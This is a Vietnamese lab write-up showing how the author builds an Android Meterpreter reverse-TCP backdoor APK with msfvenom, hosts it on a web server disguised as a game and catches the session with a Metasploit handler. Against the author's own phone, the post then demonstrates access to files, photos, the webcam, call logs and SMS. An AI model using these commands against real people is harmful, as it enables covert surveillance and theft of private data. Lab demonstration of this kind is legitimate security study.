# Hack Android với MSF

- mình thực hiện lab này với 1 laptop chạy máy ảo kali đóng giả attacker, 1 điện thoại android đóng giả làm nạn nhân

![image](https://hackmd.io/_uploads/H1oB__rk0.png)

- mình sẽ dùng phần mềm **Vysor** để hiện màn hình điện thoại lên máy tính

![image](https://hackmd.io/_uploads/ByPhGjHkC.png)

- kịch bản khai thác

  1. attacker tạo file thực thi có extension .exe để chạy trên máy victim là máy Android
  2. attacker gửi file backdoor cho victim
  3. victim sẽ tải và chạy file backdoor này
  4. và attacker có quyền điều khiển máy victim

- mình có IP của attacker là 192.176.45.103
  ![image](https://hackmd.io/_uploads/HJ_ESZHyA.png)

- mình có IP của victim là 192.176.45.102
  ![image](https://hackmd.io/_uploads/rJrRLOrkA.png)

- mình được ánh xạ địa chỉ như sau:

| Host                    | IP address       |
| ----------------------- | ---------------- |
| `Kali linux` (Attacker) | `192.176.45.103` |
| `Android` (Victim)      | `192.176.45.102` |
| `Default Gateway`       | `192.176.45.1`   |

- đầu tiên trên máy attacker mình tạo 1 file RCE với LHOST là địa chỉ máy kali linux LPORT là port sẽ nghe thông tin trả về
- và mình được file backdoor này lưu ở Desktop

```bash
msfvenom -p android/meterpreter/reverse_tcp lhost=192.176.45.103 lport=6789 > gamevul.apk
```

![image](https://hackmd.io/_uploads/BJuM8-ryR.png)

mình đưa file này vào thư mục `/var/www/html`

```bash
cp gamevul.apk /var/www/html
```

![image](https://hackmd.io/_uploads/BkiwIZHJA.png)

- và sau đó mình sẽ chạy dịch vụ server web apache2 để victim có thể truy cập đến và download file backdoor về chạy

![image](https://hackmd.io/_uploads/SJhvZPSJA.png)

- sau khi tạo xong backdoor mình sẽ thiết lập nó trên metasploit

![image](https://hackmd.io/_uploads/SJ4Ew-SkC.png)

- mình vào msfconsole và kiểm tra database đã được kết nối chưa bằng lệnh **db_status**

![image](https://hackmd.io/_uploads/HkbSwZSyC.png)

- thấy CSDL postgre đã được kết nối

- mình vào module exploit

```bash
use exploit/multi/handler
```

![image](https://hackmd.io/_uploads/HyP_v-S1C.png)

- vào set payload để điều khiển backdoor vừa tạo trên android và mình set các tham số cần thiết

```bash
set PAYLOAD android/meterpreter/reverse_tcp

```

![image](https://hackmd.io/_uploads/ryycPbryA.png)

![image](https://hackmd.io/_uploads/rk1BdWBy0.png)

- và cuối cùng là thực thi payload này với `exploit`
- và mình đợi victim truy cập vào web của mình rồi tải backdoor về chạy

- lúc này mình sẽ đóng giả làm victim truy cập vào trang web của attacker để tải file **gamevul**

![image](https://hackmd.io/_uploads/SJI2puSyA.png)

- hiện thông báo và mình nhấn **giữ lại**

![image](https://hackmd.io/_uploads/H15oadSJR.png)

- và mình cho phép tải file apk từ chrome

![image](https://hackmd.io/_uploads/r1wP6_HyA.png)

- khi file được tải xong mình mở nó lên

![image](https://hackmd.io/_uploads/SJZwkYr1A.png)

- và tiếp tục cài đặt nó dù có cảnh báo

![image](https://hackmd.io/_uploads/Hk2g1YHJR.png)

![image](https://hackmd.io/_uploads/H1klyKHJR.png)

![image](https://hackmd.io/_uploads/Hy6-1FSy0.png)

- và sau khi cài đặt thành công mình chạy file gamevul này và cho phép nó truy cập vào mọi quyền

![image](https://hackmd.io/_uploads/H1A7JKHJR.png)

- và có thông báo phiên bản gamevul của mình xây dựng cho phiên bản cũ hơn

![image](https://hackmd.io/_uploads/S1xrJFByR.png)

- nhưng khi quan sát ở máy của attacker mình đã thấy 1 session đã được thiết lập và attacker đã có CLI meterpreter

![image](https://hackmd.io/_uploads/BkIg9-SkA.png)

![image](https://hackmd.io/_uploads/HkKGBPByA.png)

- đến đây attacker đã có thể xâm nhập vào hệ thống của victim

- mình có thể dùng lệnh **help** để xem các lệnh có thể thực thi ở đây

![image](https://hackmd.io/_uploads/rk9j5-rk0.png)

### xem thông tin hệ thống

- attacker thấy được tên user hiện tại trên hệ thống

![image](https://hackmd.io/_uploads/HyAk_DBkA.png)

- thấy thiết bị của victim dùng hệ điều hành Android 11

![image](https://hackmd.io/_uploads/Hy2m5-BJ0.png)

- mình kiểm tra lại thông tin trên máy victim thấy trùng khớp

![image](https://hackmd.io/_uploads/SyspXsSyA.png)

![image](https://hackmd.io/_uploads/rygHftB10.png)

### xem thông tin các file thư mục

![image](https://hackmd.io/_uploads/Skch9-r10.png)

- mình xem được đường dẫn thư mục hiện tại

![image](https://hackmd.io/_uploads/Hyhd5ZBk0.png)

- mình liệt kê các file trong thư mục root

![image](https://hackmd.io/_uploads/BkRlyfS10.png)

- mình vào xem các file trong thư mục res

![image](https://hackmd.io/_uploads/rJkH9DrJA.png)

- mình vào xem các file trong thư mục etc

![image](https://hackmd.io/_uploads/HkVjqPry0.png)

![image](https://hackmd.io/_uploads/Hy4bjwSJC.png)

- thấy trong này có thư mục root có thư mục **sdcard** có quyền đọc và viết
- mình vào thư mục này xem và được

![image](https://hackmd.io/_uploads/ryFklfByA.png)

- xem thư mục download được file gamevul.apk mình vừa tải

![image](https://hackmd.io/_uploads/SJlmxzBkR.png)

- mình đi recon các thư mục còn lại trong sdcard

![image](https://hackmd.io/_uploads/rkydefrkA.png)

- trong đó có thư mục DCIM có lưu các ảnh chụp màn hình của victim

![image](https://hackmd.io/_uploads/BysGpPSkA.png)

- mình download ảnh cuối cùng trên máy victim (nó sẽ được lưu trên Desktop của mình) và mình mở nó ra xem và thấy được hình ảnh

![image](https://hackmd.io/_uploads/BkITaDr10.png)

tiếp theo mình sẽ đổi hình nền màn hình điện thoại của victim thành hình ảnh này

- trước tiên mình sẽ tiếp tục chạy session này tại background
- và tìm payload đổi hình nền màn hình

![image](https://hackmd.io/_uploads/H1BBRwr10.png)

- cung cấp những yêu cầu cần thiết để chạy payload
- và mình chạy nó

![image](https://hackmd.io/_uploads/SyexkOHJR.png)

- và quan sát trên Vysor thấy hình nền điện thoại của victim đã bị thay đổi

![image](https://hackmd.io/_uploads/HkyBkurJ0.png)

### xem thông tin mạng

![image](https://hackmd.io/_uploads/HyIa5Zr1C.png)

![image](https://hackmd.io/_uploads/ry-GTbHkC.png)

### xem các tiến trình hệ thống

![image](https://hackmd.io/_uploads/HJ4A9bSk0.png)

![image](https://hackmd.io/_uploads/HyqkIPH1C.png)

### xem webcam

![image](https://hackmd.io/_uploads/Bk1Mo-S1A.png)

- mình liệt kê các webcam trên thiết bị thấy có 1 camera trước và 2 camera sau của điện thoại

![image](https://hackmd.io/_uploads/r1Kfn-r1R.png)

- mình tiến hành xem webcam

![image](https://hackmd.io/_uploads/rygF3ZH10.png)

### xem lịch sử cuộc gọi

![image](https://hackmd.io/_uploads/H12STbByA.png)

- mình mở ra xem được danh sách các thuê bao

![image](https://hackmd.io/_uploads/B1l5pWSkR.png)

### xem lịch sử tin nhắn

![image](https://hackmd.io/_uploads/ryYEoZHy0.png)

![image](https://hackmd.io/_uploads/H1SkCbByA.png)

- mình mở lên xem được

![image](https://hackmd.io/_uploads/SkgzCbBJC.png)

### xem ảnh chụp màn hình

![image](https://hackmd.io/_uploads/S1fWo-ryR.png)

![image](https://hackmd.io/_uploads/HkYiobHyC.png)

![image](https://hackmd.io/_uploads/BkgRj-ryA.png)

### lấy được shell

![image](https://hackmd.io/_uploads/BJihZMBkC.png)

- mình có thể xem được các nhóm mà user hiện tại trên hệ thống tham gia

![image](https://hackmd.io/_uploads/rkZOGMHJC.png)

![image](https://hackmd.io/_uploads/BJLjGzH1C.png)

- attacker có thể yêu cầu máy victim ping đến 1 máy đích

![image](https://hackmd.io/_uploads/H1t57GS1R.png)

- attacker có thể yêu cầu máy victim request đến 1 trang web

![image](https://hackmd.io/_uploads/HkS4LwryR.png)

### xem các app được cài trên máy victim

![image](https://hackmd.io/_uploads/SyBCIvB1A.png)

### thực hiện các câu lệnh SQL

![image](https://hackmd.io/_uploads/S1t4vDHJR.png)

### check root

- mình xem máy có chạy lại hệ điều hành khác không phải là bản gốc hệ điều hành do nhà sản xuất phát hành không hay là thiết bị được mua cũ và đã bị cắt giảm bớt hay thêm các phần mềm khác

![image](https://hackmd.io/_uploads/B1dO0Wry0.png)

- và thấy not rooted -> thiết bị chạy bản gốc của hệ điều hành do nhà sản xuất phát hành

### các nhóm lệnh khác

![image](https://hackmd.io/_uploads/B1OXsZryA.png)

![image](https://hackmd.io/_uploads/S14Bo-HyA.png)

### Kiểm tra virus với file gamevul.apk

- có 26/64 phần mềm phát hiện có mã độc

![image](https://hackmd.io/_uploads/H1w99qSJC.png)

![image](https://hackmd.io/_uploads/ryvj5qSk0.png)
